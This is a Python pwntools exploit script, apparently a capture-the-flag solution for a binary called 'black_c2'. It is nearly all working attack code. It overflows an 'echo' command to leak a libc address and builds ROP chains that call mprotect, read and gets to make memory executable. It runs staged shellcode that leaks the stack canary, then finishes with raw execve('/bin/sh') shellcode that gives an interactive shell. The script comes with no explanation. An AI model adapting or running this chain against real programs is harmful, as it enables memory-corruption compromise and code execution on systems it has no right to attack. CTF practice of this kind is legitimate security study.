from pwn import *

TARGET = './black_c2'
HOST = '127.0.0.1'
PORT = 1337
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
#context.timeout = 1000
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    libc = ELF('libc.so.6')
else:
    p = process(TARGET)
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    gdbscript = '''
    set follow-fork-mode child
    #b *tasks+348
    b *echo+33
    #b *jobs
    #b *main+608
    #b *main+509
    '''
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
       #gdb.attach(p, gdbscript=gdbscript)
       p = gdb.debug(TARGET, gdbscript)

#--- helper functions
s       = lambda data               :p.send(data)        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---
sla(": ", "echo")
# s("A"*0x8)
# pause()
s("A"*0x100)
ru("A"*0x100)

libc_base = uu64(r(6)) + 0x39c0
# libc_base = uu64(r(6)) - 0x94ac3

leak("libc_base", libc_base)
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
mprotect = libc_base + libc.symbols['mprotect']
_read = libc_base + libc.symbols['read']
gets = libc_base + libc.symbols['gets']
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x00000000000904a9
jmp_rdi = libc_base + 0x00000000000b131c

sla(": ", "echo")
payload = b"B"*0x118
payload += p64(pop_rdi) + p64(libc_base) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_rbx) + p64(7) + p64(0) + p64(mprotect)
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(libc_base) + p64(pop_rdx_rbx) + p64(0x300) + p64(0) + p64(_read)
payload += p64(pop_rdi) + p64(libc_base) + p64(jmp_rdi)
payload = payload.ljust(0x920, b"B")
payload += p64(libc_base - 0x39c0) + b"B"*0x20

#print(len(payload))

s(payload) # Trigger child rop
# Stage 2

canary_addr = libc_base - 0x2898
sc = b""
sc += asm(f"""
mov rdi, {canary_addr}
mov rax, [rdi]
mov rsi, {libc_base+0x108+0x108}
mov [rsi], rax
""")
sc += asm(shellcraft.write(6, libc_base+0x100, 4))
sc += asm(shellcraft.write(6, libc_base+0x108, 0x300))
sc += asm(shellcraft.exit(0))
sc = sc.ljust(0x100, b"\x00")
sc += p32(0x300) + p32(0)
sc += b"C"*0x108
sc += p64(0x41414141) + p64(0)
#sc += p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh) + p64(system)
sc += p64(pop_rdi) + p64(libc_base) + p64(pop_rsi) + p64(0x1000) + p64(pop_rdx_rbx) + p64(7) + p64(0) + p64(mprotect)
sc += p64(pop_rdi) + p64(libc_base) + p64(gets) 
sc += p64(pop_rdi) + p64(libc_base) + p64(jmp_rdi)
sleep(3)
s(sc)

sl("exit")
sleep(3)
sc = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

sl(sc)

sl("ls")
p.interactive()
